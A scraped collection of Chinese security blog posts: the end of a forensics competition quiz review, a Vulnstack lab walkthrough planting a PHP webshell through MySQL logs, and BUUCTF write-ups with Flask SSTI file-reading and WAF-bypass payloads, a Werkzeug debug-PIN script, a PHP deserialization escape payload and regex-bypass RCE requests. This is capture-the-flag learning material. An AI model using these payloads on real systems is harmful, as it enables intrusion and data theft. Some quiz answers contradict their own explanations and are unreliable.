rm bluetooth.service 1D # 80. [单选题] cron 服务在 LINUX 系统中充当作业调度程序。现在准备启动和关闭一个 Web 服务器（httpd.service），上午 8 时 30 分（启动）- 下午 6 时 06 分（关闭）；周一至周五，以下哪个 crontab 设置适用于这种情况？ (1 分) A. 30 8 * 1-5 * /usr/bin/systemctl start httpd.service 及 06 18 * 1-5 * /usr/bin/systemctl stop httpd.service B. 30 8 * * 1-5 /usr/bin/systemctl start httpd.service 及 06 18 * * 1-5 /usr/bin/systemctl stop httpd.service C. 30 8 1-5 * */usr/bin/systemctl start httpd.service 及 06 18 1-5 * */usr/bin/systemctl stop httpd.service D. 30 8 * * * /usr/bin/systemctl start httpd.service 及 06 18 * * * /usr/bin/systemctl stop httpd.service E. 以上都不是 1B 查询得到以下知识点 12345678910111213141516171819202122232425262728293031323334353637cron 的定时任务需要在作业文件中设定执行时间，包括时分秒、天数等，一共 7 个部分，格式如下：分 时 日 月 星期 年 命令其中：分：必须，可选 0-59，可设置 ,-*/ 特殊字符时：必须，可选 0-23，可设置 ,-*/ 特殊字符日：必须，可选 1-31，可设置 ,-*?/LW 特殊字符月：必须，可选 1-12或 jan-dec，可设置 ,-*/ 特殊字符星期：必须，可选 0-7 或 sun-sta，可设置 ,-*?/L# 特殊字符年：非必须，可留空，可设置 1970-2099，可设置 ,-*/ 特殊字符cron服务几个特殊字符的含义如下：\\* 全部。意思是在该时间的任意点都应当执行?不指定，任意。仅用于 日(月)和日(周)。0 0 5 *? 代表每个月的第5天零点，不论星期几。0 0 ? * 1 代表每周一，不论是当月的哪天。, 多个值的[分隔符](https://zhida.zhihu.com/search?content_id=166581347&amp;content_type=Article&amp;match_order=1&amp;q=分隔符&amp;zhida_source=entity)，例如1,5,10\\- 代表连续值，例如1-20/ 步长。例如 5/15，代表从5开始，以15为步长。因此，当5/15位于分钟的位置时，表示小时内的第5、20、35和50分钟。L 最后一天。可以是每月最后一天或者每周最后一天。如果用在 天(周)字段，并且前面加数字，则表示最后一个周N。例如5L，表示最后一个周五（5表示周五，L表示最后）。W 工作日，指周一到周五的任意一天\\# 表示第几个的意思，例如 6#3，表示当月第3个星期六（6表示周六，3表示第3个） # 81. [单选题] 以下哪个 Linux 命令可以显示目录中的所有文件，包括隐藏文件？ (1 分) A. ls -ls B. ls -asl C. ls -lAs | wc D. ls -als | grep ssh E. None 1B # 82. [单选题] 如果您想要检查 Linux 系统上可用的剩余磁盘空间量，您会使用以下哪个命令？ (1 分) A. df -vh B. df -sh C. dl -vh D. dd -sh E. dt -vh 1A 开个虚拟机试一下就好 # 83. [单选题] Dockerfile 是一个文本文档，用于在 Docker 架构中生成哪个组件？ (1 分) A. docker engine B. image C. container D. volumes E. docker network 1C dockerfile 用于生成 Docker 的镜像，而不是容器本身。 # 84. [单选题] 在 Linux 系统中，哪个不是内存区？ (1 分) A. [heap] B. [stack] C. [paging] D. [vvar] E. [vdso] 1C heap,stack 即堆栈，vvar 是存储系统变量的区域，vdso 存储特定系统调用的代码的内存区域，允许用户在用户空间进行调用而不用进入内核空间。paging 是把物理内存映射到虚拟内存的技术，本身并不是内存区。 # 85. [单选题] 以下命令中，哪个命令可以对 &quot;export-logs&quot; 输出进行排序？(1 分) A. export-logs&lt;sort B. export-logs&gt;sort C. export-logs&amp;sort D. export-logs|sort E. export-logs&lt;&gt;sort 1D # 86. [多选题] 哪些文件会影响 Linux 主机的名称解析功能？ (1 分) A. /etc/resolv.conf B. /etc/hosts C. /etc/default/names D. /etc/nsswitch.conf E. /etc/inet/hosts # 87. [单选题] 哪个系统文件包含了一般的端口、关联的服务和协议？ (1 分) A. /etc/services B. /etc/sysconfig/network-scripts C. /etc/services.conf D. /etc/inet/hosts E. Noneofthechoices 1ABD A 配置 DNS 服务器，B 配置本地域名解析，C 不存在，D 配置 linux 系统的名称解析服务顺序，E 不存在 # 88 [填空题] 在 Windows 10 中 \\Users\\qqqqq\\Downloads，视频文件 (mixkit-two-women-laying-together-925-medium.mp4) 在 MFT 中分成多少个 Data Cluster 储存？提示：请以阿拉伯数字作答 (1 分) 15 虚拟机文件本身无法直接导出 $MFT，所以先用取证大师把镜像打包成 dd 用 Mft2Csv 分析 mft 2023 美亚杯个人赛全题目复盘_数据安全竞赛复盘 - CSDN 博客 剩余步骤参考以上博客，我还没搞明白 # 89. [单选题] 在 Windows 10 中 \\Users\\qqqqq\\Downloads\\ mixkit-two-woman-laying-together-925-medium.mp4 的 last Access 时间是多少？(1 分) A. 2023/07/10 18:31:32 B. 2023/07/10 18:31:01 C. 2023/07/10 19:31:22 D. 2023/07/11 19:31:22 1A access 就是访问的意思，所以 last Access 就是最新的读取时间 # 90. 在 Windows 7 中 \\Users\\Allen\\Desktop，有 1 个 MP3 文件 (例:unlock-me-149058.mp3)，用户使用什么程序打开该 MP3 文件？提示：请以小写字母作答 (1 分) 1potplayer # 91. [单选题] 在 Windows 7 中 ’ \\Users\\Allen\\Desktop ‘有 1 个 MP3 文件 (unlock-me-149058.mp3)，该文件的 Zone identiflier 为’3’。'3’代表哪一个 security Zone? (1 分) A. Local Machine Zone B. Internet Zone C. Restricted Zone D. Trust Site Zone 1B Zone Identifier 可以有以下几个值： 0：本地计算机 1：本地内网 2：受信任的站点 3：互联网 4：受限制的站点 # 92. [单选题] 在 Windows 7 中 \\Users\\Allen\\Desktop 有 1 个 MP3 文件 (unlock-me-149058.mp3)，该文件从哪个网站下载？(1 分) A. www.Pixbay.com B. free-mp3-download.net/ C. https://mp3juices.nu D. mygomp3.com 1A google 的下载记录中没有就去缓存中搜索，url 过滤 unlock-me-149058.mp3 即可搜到 # 93. [单选题] 在 Windows 7 中 \\Users\\Allen\\Downloads 内有 mp3 文件 (miracle.mp3), 更改名称时间？(2 分) A. 2023-07-13 02:55:20 B. 2023-07-15 10:55:20 C. 2023-07-12 10:58:04 D. 2023-07-13 10:55:20 1D ntfs 日志分析 # 94. [填空题] 在 Windows 7 中 \\Users\\Allen\\Downloads 内有 mp3 文件 (miracle.mp3), mp3 文件更改名称前的名称是什么？提示：请以与记录相同的名称与文件格式作答 (1 分) 1a-small-miracle-132333.mp3 # 95. [单选题] 在 Windows 7 中有多少个文件曾被 potplayer 播放？(1 分) A. 7 B. 8 C. 9 D. 10 1B 在最近访问记录中查找 # 96. [填空题] 在 Windows 7 中，potplayer 最后播放的文件名？提示：请以与记录相同的名称 (包括小写字母、阿拉伯数字与符号) 与文件格式作答 (1 分) 1unlock-me-149058.mp3 仿真后打开 potplayer 但是我觉得最对的应该是看时间线，过滤 potplayer 查看这个.dpl 文件，里面记录了 playlist 即为播放列表 # 97. [单选题] 事件应急小组正在处理一起网络事件。以下哪一个指令是设定取证服务器以作取得内存内容的初步步骤？(3 分) A. nc -l 4444 &gt;mem126.lime.gz B. Insmod lime.ko “pathtcp:4444 format=lime digest=sha256 compress=1” C. scp -I ~/DFIRSciAWTest.pem lime.ko ec2-duckman@3.137.169.127:~/scp -I ~/DFIRSciAWTest.pem /usr/bin/nc ec2-duckman@3.137.169.127:~/ D. ssh duckman@&lt;target_server_ip&gt; “sudo dd if=/dev/mem | gzip -1 -” &gt; memory_dump.gz 1C 大佬的 wp 里面查的 gpt 借用记录一下 # 98. [单选题] 基于两个 SQLite 数据库文件 “cus_202308102034.json” 和 “date_202308101120.json”，编译一个 SQLite 脚本找出谁前往目的地 “莫斯科 &quot;。 (3 分) A. SELECT c.customer_name, c.destination, datetime(d.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’) AS arrival_time_hk FROM cus c INNER JOIN date d ON c.destination = d.Destination WHERE c.destination = ‘Moscow’ B. SELECT cus.customer_name, cus.destination, datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’) AS arrival_time_hk FROM cus INNER JOIN date ON customer_id = date.id WHERE cus.destination = ‘Moscow’ AND date.Destination = ‘Moscow’ AND date.arrival_timestamp_HK IS NOT NULL AND datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’) C. SELECT cus.customer_name, cus.destination, date.arrival_timestamp FROM cus INNER JOIN date ON cus.destination = date.destination；WHERE cus.destination = ‘Moscow’ AND date.Destination = ‘Moscow’ D. SELECT cus.customer_name, cus.destination, datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’) AS arrival_time_hk FROM cus INNER JOIN date ON cus.destination = date.Destination WHERE cus.destination = ‘Moscow’ AND date.Destination = ‘Moscow’ AND date.arrival_timestamp_HK IS NOT NULL AND datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’) 1D json 导入 mysql，导出 csv，导入 sqlite，执行 sql 语句 A 错的原因是查询试图从两个表（cus 和 date）中选择字段，并通过 INNER JOIN 操作将它们连接在一起。然而，它在连接条件中使用了错误的别名。在这个查询中，表 cus 和 date 被分别赋予了别名 c 和 d，但在 ON 子句中，它错误地使用了 c.destination = d.Destination。正确的应该是 c.destination = d.destination。 # 99. [填空题] 写一个 Powershell 脚本以提取正在连接到 Window 11 计算机的可移动设备的记录，提取相关的数据如装置名称、制造商、装置详情、硬件编号，并用 “Write-Host” 指令显示数据。 (2 分) 不会 # 100.[填空题] 编写一个 PowerShell 脚本从 Windows Server 2012 R2 获取具有管理员权限的所有使用者活动。使用 &quot;Where-Object&quot; 命令来进一步过滤事件，如果事件的第 9 个属性与内建的 Administrator 账户的安全标识符（SID）匹配，则确保只选择与管理员活动相关的事件。 (3 分) 18 不会","categories":[{"name":"取证","slug":"取证","permalink":"https://dr4x3zz.github.io/categories/%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"取证","slug":"取证","permalink":"https://dr4x3zz.github.io/tags/%E5%8F%96%E8%AF%81/"}]},{"title":"Vulnstack红日靶场","slug":"Vulnstack红日靶场","date":"2024-06-06T11:41:48.000Z","updated":"2024-11-08T10:11:06.949Z","comments":true,"path":"2024/06/06/Vulnstack红日靶场/","link":"","permalink":"https://dr4x3zz.github.io/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/","excerpt":"","text":"# 一、网络配置 参考小破站 BV13W4y1t7qB # 二、信息收集 在 c 盘目录找到 phpstudy，打开看看本地 127.0.0.1 注：需要重启一次 win7 不然 phpstudy 无法使用 可以看到绝对路径 C:/phpstudy/WWW 用 nmap 扫一下看看有没有什么有用的信息，扫描 22 网段，端口 开放了 mysql 端口 3306 和本地的 80 端口也就是上面的 php 探针 用弱口令尝试登录 mysql dirb 扫一下目录收集信息 # 三、漏洞利用 存在 phpmyadmin，访问 root:root 登录 查询日志信息，尝试在日志里写入 shell 日志关闭，打开日志 指定 mysql 查询日志的输出文件路径设置为指定路径下的 muma.php 写入一句话木马 访问一下看看上传是否成功 蚁剑连接 配合 CS，配置服务端（kali_ip 创建密码） 配置客户端 编辑监听器，点击 add 点击 攻击 - 生成后门 - windows 可执行程序 选择 web 监听器保存 exe 文件在桌面 蚁剑","categories":[{"name":"渗透","slug":"渗透","permalink":"https://dr4x3zz.github.io/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://dr4x3zz.github.io/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"buuctf刷题5","slug":"buuctf刷题5","date":"2024-04-17T11:57:08.000Z","updated":"2024-11-08T10:06:02.046Z","comments":true,"path":"2024/04/17/buuctf刷题5/","link":"","permalink":"https://dr4x3zz.github.io/2024/04/17/buuctf%E5%88%B7%E9%A2%985/","excerpt":"# [GYCTF2020]FlaskApp","text":"# [GYCTF2020]FlaskApp 提到 flask 肯定会想到 ssti，但是这类题目接触的特别少，这里存一下：ssti 详解与例题以及绕过 payload 大全 https://blog.csdn.net/weixin_54515836/article/details/113778233 留一个：Python 模板注入 (SSTI) 深入学习 https://xz.aliyun.com/t/6885?time__1311=n4%2BxnD0DRDyB5q053b7e0QKQY5DtKKezDcYD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F 本题点击提示 f12 可以看到 pin 这样的字眼，和 flask 结合查了一下，是和 debug 相关，简单来说就是要通过 ssti 注入的手段得到 debug 的 pin 码 想要拿到 pin 码必须知道： 1234567usrname: 就是启动这个 Flask的用户modname： 一般为flask.appgetattr(app, “__name__”, app.__class__.__name__)：python该值一般为Flask 值一般不变getattr(mod, &#x27;file&#x27;, None)：为flask目录下的一个app.py的绝对路径uuid.getnode()：就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式get_machine_id() ：/etc/machine-id或者 /proc/sys/kernel/random/boot_i中的值假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\\Microsoft\\Cryptography的值，假如是Docker机，那么为 /proc/self/cgroup docker行 输入这个 pin 码的入口在哪？随便在解码的地方输入一个非 base64 可以解码的内容就会报错，在右上角有一个小窗口，点击就可以 歪打正着还找到了 app.py 的绝对路径 /usr/local/lib/python3.7/site-packages/flask/app.py 尝试利用 ssti 读取 app.py 的内容（三种读取方法） 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;app.py&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;app.py&#x27;).read()&#125;&#125; base64 加密，然后在解码的窗口注入 这里的内容好像不影响做题 读取 /etc/passwd 1&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125; 发现用户名是 flaskweb 读 /sys/class/net/eth0/address 来获得 mac 的地址 1&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;/sys/class/net/eth0/address&#x27;).read()&#125;&#125; 将 fa93c2fad795 转为 10 进制得到 275512538355605 因为本题是 docker 环境，所以读取 /proc/self/cgroup 1&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;/proc/self/cgroup&#x27;).read()&#125;&#125; 不知道为什么别人都可以 docker 读取 id 我这就没有，记录一下做法吧，得到这个 id，就写脚本把 pin 跑出来 1234567891011121314151617181920212223242526272829303132333435363738394041from itertools import chainimport hashlibprobably_public_bits = [ &#x27;flaskweb&#x27;,# username &#x27;flask.app&#x27;,# modname &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),]private_bits = [ &#x27;2485377871320&#x27;# str(uuid.getnode()), /sys/class/net/eth0/address &#x27;31c24e0fd34a09126aa47d88e21b8b28efcce8acd630632e4e4a9baddff38757&#x27;, # get_machine_id(),/etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 这里直接记录一下脚本吧，然后输入 pin，进入交互式 shell，执行命令 1os.popen(&quot;cat /this_is_the_flag.txt&quot;).read() 读取 flag 因为我 docker 查不到 id，就一直找看看别人有没有这种情况，然后看到了一个佬直接绕过 waf，得到 flag，记录一下 https://sakurahack-y.github.io/2022/02/27/BUU-% E6% A8% A1% E6%9D% BF% E6% B3% A8% E5%85% A5% E4% B8%93% E9% A1% B9% E5%88% B7% E9% A2%98/ 用上面的语句读取 app.py 整理一下得到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from flask import Flask,render_template_stringfrom flask import render_template,request,flash,redirect,url_forfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapimport base64 app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = &#x27;s_e_c_r_e_t_k_e_y&#x27;bootstrap = Bootstrap(app) class NameForm(FlaskForm): text = StringField(&#x27;BASE64加密&#x27;,validators= [DataRequired()]) submit = SubmitField(&#x27;提交&#x27;)class NameForm1(FlaskForm): text = StringField(&#x27;BASE64解密&#x27;,validators= [DataRequired()]) submit = SubmitField(&#x27;提交&#x27;) def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] for x in black_list : if x in str.lower() : return 1 @app.route(&#x27;/hint&#x27;,methods=[&#x27;GET&#x27;])def hint(): txt = &quot;失败乃成功之母！！&quot; return render_template(&quot;hint.html&quot;,txt = txt) @app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])def encode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64encode(text.encode()) tmp = &quot;结果 :&#123;0&#125;&quot;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for(&#x27;encode&#x27;)) else : text = &quot;&quot; form = NameForm(text) return render_template(&quot;index.html&quot;,form = form ,method = &quot;加密&quot; ,img = &quot;flask.png&quot;) @app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])def decode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64decode(text.encode()) tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode()) if waf(tmp) : flash(&quot;no no no !!&quot;) return redirect(url_for(&#x27;decode&#x27;)) res = render_template_string(tmp) flash( res ) return redirect(url_for(&#x27;decode&#x27;)) else : text = &quot;&quot; form = NameForm1(text) return render_template(&quot;index.html&quot;,form = form, method = &quot;解密&quot; , img = &quot;flask1.png&quot;) @app.route(&#x27;/&lt;name&gt;&#x27;,methods=[&#x27;GET&#x27;])def not_found(name): return render_template(&quot;404.html&quot;,name = name) if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True) 查看 waf 123def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] 利用 python 字符之间用 + 拼接绕过 waf 查看目录 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 看到疑似存 flag 的文件 this_is_the_flag.txt，读取 1&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_f&#x27;+&#x27;lag.txt&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 得到 flag 参考文章：https://blog.csdn.net/SopRomeo/article/details/105875248 ​ https://blog.csdn.net/rfrder/article/details/110240245 ​ https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/ # [0CTF 2016]piapiapia 多次尝试登录，能得到的只有 Invalid password 或者 Invalid user name or password 扫一下看看 扫出来了几个， /register.php 注册完之后可以登录 那 update 和 profile 的作用应该都差不多知道了，这个有个浏览选择文件，难道是文件上传漏洞吗？ 有个 zip 先下载看看，防止等下文件上传半天无用功 代码审计，config 中看到了 flag 字眼 在审计 profile 和 update 的时候看到了几个熟悉的函数 profile 中的 unserialize 和 file_get_contents update 中的 unserialize 查看 profile 中 file_get_contents 函数中的参数 photo，底下的 html 中有一个 echo 参数 photo，猜测本题的突破口就在这个参数中 倒推会去，看看 photo 参数怎么得到的 photo 内容存在 profile 数组键值为 photo 中，profile 有从 user 的 show_profile 传过来，而且和 username 这个参数相关 继续往上看，跟到 class.php 中，在 user 类中找到 show_profile 函数 这里调用了父类 mysql 类的 filter 函数以及 select，先看看 filter 123mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )preg_replace (正则表达式, 替换成什么东西, 目标字符串) 先将 escape 数组内的单引号和两个 \\\\ 用 | 和两个 / 连接起来，得到一个正则表达式，匹配的是单引号和双斜杠 \\\\ ，将这两个全部换成下划线 _ 同理 safe 参数中也是构造一个正则表达式， /select|insert|update|delete|where/i 不区分大小写地匹配这些关键字，将这些替换成 hacker 返回 再看看 select 函数 常见的 sql 查询语句，在查询之前，如果我们注册了新的用户，需要更新一下表单，找一下插入新数据的函数 然后再去找找哪里调用了这个函数 username 和 new_profile 两个参数都经过了 filter 的过滤才插入表中，接着找找 update_profile 在哪里调用了 在 update.php 中可以找到 通过 post 方法得到信息之后序列化在传入，同时看到 photo 传入之后会被 md5 编码了 倒推完成之后就可以理清楚调用链条了 update.php profile 的 POST 传参 -&gt;class.php update_profile ()-&gt;update ()-&gt; 数据库中的表单 -&gt;select ()-&gt;show_profile ()-&gt;profile.php file_get_contents () 回到 file_get_contents 函数中说的那个 photo 参数，在审计 update 的时候发现传入的 photo 文件会被 md5 编码了，所以不得不换一个参数了，nickname 参数，可能是因为 nickname 的字符匹配相对没有那么严格吧，在 update.php 这一题用到了之前刷题学过的反序列化字符逃逸，重新复习一下在 buuctf 刷题 4 中的 [安洵杯 2019] easy_serialize_php 回到这一题，这题也是用到了字符逃逸，我们的目标是读取 config.php 函数，上面写到了 config.php 函数里有 flag 字样，尝试读取 在构建反序列化的同时 profile 文件里面有反序列化的顺序 nickname 参数后面还有 photo 参数，这是读取文件的地方 但是如何才能让 nickname 参数的反序列化后传给 photo 我们想要的内容呢，在上面的正则表达式中 where 会被替换成 hacker，从 5 位变成 6 位，如果我们有一定数的 where，再替换成 hacker 之后，序列化 s:字符数量:&quot;字符&quot; ，字符数量这个数字不变，实际上双引号内的字符从 5 变成 6，如果我们用定量的 where，就能把 nickname 的反序列化的内容顶出去，成为 photo 的内容 用具体的数字来说，假如我传入 20 个 where，以及长度为 20 的攻击命令，字符数量填 120，where 占 100，但是在经过替换成 hacker 之后，where 就变成了 120 个字符，还有 20 的攻击命令，我们填的是 120，但是现在实际上有 140 个字符，反序列化之后 nickname 根据我们写的字符数量只取前 120 个，剩下的 20 个就可以是我们的攻击指令 尝试构造，我们想要让攻击命令传到 photo 参数中，是需要伪造一个 photo 参数的序列化即 s:5:&quot;photo&quot;; ，同时需要加上读取 config.php 的序列化 s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 这时候不能忘记有个对 nickname 长度检测的函数，所以 nickname 需要传入 nickname [] 以数组形式绕过检测，而数组的序列化和字符的序列化有所不同，这里我就不复现了直接借一下图 可以清晰的看到数组还多了一个 {} 的闭合，所以在 where 的最后还需要加上一个} 来闭合 先构造出除去 where 的 payload： 1&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 最前面的双引号是用来闭合 where 字符的，大括号用来闭合数组的，这些字符总共有 34 个，所以我们需要 34 个 where 来把这些攻击命令挤出去，为什么 ;&#125; 也要挤出去呢，因为这些闭合的符号是不计在 s:数量:字符 数量中的 ok 添加 34 个 where 得到最终的 payload 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 通过 register 界面注册一个账号，update 完成字符逃逸获取 flag，用 bp 抓包 123Content-Disposition: form-data; name=&quot;nickname[]&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 放包查看 profile base64 解码 拿到 flag， $flag = 'flag&#123;fd06d0b1-5eb2-45f1-b3a0-2bacf858424a&#125;'; 参考：https://blog.csdn.net/qq_43622442/article/details/105751356 这审计太花眼了，一个个函数的推导感觉要做很多才会有很清晰的思路，还需要学习 # [FBCTF2019]RCEService 本题要用 JSON 格式，先试一下查看目录试试看吧 &#123;&quot;cmd&quot;:&quot;ls&quot;&#125; 读取一下 index.php 看看 1&#123;&quot;cmd&quot;:&quot;cat index.php&quot;&#125; 被过滤了吗，试了试别的常用指令，都是这样，可能存在过滤吧，看了看师傅们的 wp，哪来的源码啊 没办法，只能拿过来先学了 123456789101112131415161718192021222324&lt;?phpputenv(&#x27;PATH=/home/rceservice/jail&#x27;);if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123; $json = $_REQUEST[&#x27;cmd&#x27;]; if (!is_string($json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; else &#123; echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;; $cmd = json_decode($json, true)[&#x27;cmd&#x27;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#x27;Invalid input&#x27;; &#125; echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;; &#125;&#125;?&gt; 先对传入的 cmd 检测是否为字符串，如果是字符串就进行正则的检测，但是也没看到 cat 啥的被过滤啊 在看 wp 的时候看到了这个是和环境变量有关系， putenv('PATH=/home/rceservice/jail'); 本题的环境变量被替换成了这个，而 cat 一般都是在 usr/bin 目录下的，所以用这个命令需要使用绝对路径 正则匹配表达式采用了 ^ $ 的格式，同时也采用了 .* 这样的贪婪匹配，这就可以引出两种解法，一个是 %0A 的 preg_match 的多行绕过和回溯次数超限，详细的回溯次数超限可以看这个 https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html %0A %0A 的绕过是因为 preg_match 只会匹配一行的数据，加上正则表达式中存在 \\x00-\\x1FA 会匹配一个 %0A 所以构造 payload 的时候，前后多加几个 %0A 就能达成绕过的效果了 先查看 path 环境下各级目录，能不能找到 flag，jail 就是 index.php 已经知道了，查看上一级 1?cmd=%0A&#123;&quot;cmd&quot;:&quot;ls /home/rceservice/&quot;&#125;%0A%0A 存在 flag，直接读取，注意要用 cat 的绝对路径 1?cmd=%0A&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;&#125;%0A%0A 回溯次数超限 详细的可以看上面提到的链接，这里直接上脚本读取了 123456789import requestsurl = &#x27;http://4e855554-62b3-45bc-a775-aed80066cc3e.node5.buuoj.cn:81/&#x27;payload = &#123; &#x27;cmd&#x27;:&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;temp&quot;:&quot;&#x27;+&#x27;a&#x27;*1000000+&#x27;&quot;&#125;&#x27;&#125;req = requests.post(url=url,data=payload).textprint(req) 变量 cmd 后面不能直接跟用来超出回溯限制的内容，会影响命令，所以需要一个新的变量用来存用来回溯的内容，这里引入新的变量 temp 参考：https://www.cnblogs.com/Article-kelp/p/16046129.html https://blog.csdn.net/rfrder/article/details/110573955","categories":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/categories/buuctf/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/tags/buuctf/"}]},{"title":"buuctf刷题4","slug":"buuctf刷题4","date":"2024-02-25T15:22:18.000Z","updated":"2024-11-08T10:05:54.263Z","comments":true,"path":"2024/02/25/buuctf刷题4/","link":"","permalink":"https://dr4x3zz.github.io/2024/02/25/buuctf%E5%88%B7%E9%A2%984/","excerpt":"# [安洵杯 2019] easy_serialize_php","text":"# [安洵杯 2019] easy_serialize_php 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return 